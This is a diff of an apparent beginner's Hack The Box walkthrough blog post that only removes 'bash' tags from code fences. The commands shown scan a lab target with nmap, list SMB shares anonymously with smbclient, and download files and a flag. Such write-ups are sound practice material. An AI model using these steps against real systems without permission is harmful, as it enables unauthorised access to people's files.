@@ -7,7 +7,7 @@ Note: I’m not an expert. I’m writing this blog just to document my learning 
 
 First, connect your system to the HTB VPN using the `.ovpn` config file.
 
-```bash
+```
 sudo openvpn htb.ovpn
 ```
 
@@ -31,7 +31,7 @@ Example IP:
 
 Use Nmap to find open ports and running services:
 
-```bash
+```
 nmap -A 10.129.22.153
 ```
 
@@ -57,7 +57,7 @@ This confirms SMB is running on the target.
 
 Install it:
 
-```bash
+```
 sudo apt update
 sudo apt install smbclient
 ```
@@ -68,7 +68,7 @@ sudo apt install smbclient
 
 Use `smbclient` to list the shares:
 
-```bash
+```
 smbclient -L \\\\10.129.22.153\\ -N
 ```
 
@@ -87,13 +87,13 @@ We’ll explore `WorkShares` — the only one that might be accessible.
 
 ## 🔓 Step 7: Access WorkShares
 
-```bash
+```
 smbclient \\\\10.129.22.153\\WorkShares -N
 ```
 
 Then list the contents:
 
-```bash
+```
 ls
 ```
 
@@ -110,7 +110,7 @@ James.P
 
 ### 1. Get worknotes from Amy.J
 
-```bash
+```
 cd Amy.J
 ls
 get worknotes.txt
@@ -118,7 +118,7 @@ get worknotes.txt
 
 ### 2. Get the flag from James.P
 
-```bash
+```
 cd ..
 cd James.P
 ls
@@ -130,7 +130,7 @@ exit
 
 ## 📜 Step 9: Read the Flag
 
-```bash
+```
 cat flag.txt
 ```
 
